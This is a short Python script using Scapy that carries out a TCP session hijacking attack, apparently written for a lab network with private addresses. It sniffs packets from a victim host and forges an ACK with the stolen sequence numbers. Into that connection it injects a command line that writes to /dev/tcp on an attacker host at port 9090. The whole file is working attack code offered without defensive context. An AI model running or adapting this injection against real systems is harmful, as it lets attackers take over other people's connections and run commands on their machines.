#!/usr/bin/python3

import sys
from scapy.all import *

def spoof_tcp(pkt):
	IPLayer = IP(dst="192.168.5.2", src=pkt[IP].dst)
	TCPLayer = TCP(flags="A", seq=pkt[TCP].ack, ack=pkt[TCP].seq, dport=80, sport=pkt[TCP].dport)

	print("Source port: ", pkt[TCP].dport)
	print("Destin port: ", pkt[TCP].sport)
	print("Next Sequen: ", pkt[TCP].seq)
	print("Ack number : ", pkt[TCP].ack)

	Data = "\r '<?php phpinfo();?>' > /dev/tcp/192.168.5.1/9090\r"
	spkt = IPLayer/TCPLayer/Data
	send(spkt, verbose=0)
	exit()

pkt=sniff(filter='tcp and src host 192.168.5.2', prn=spoof_tcp)
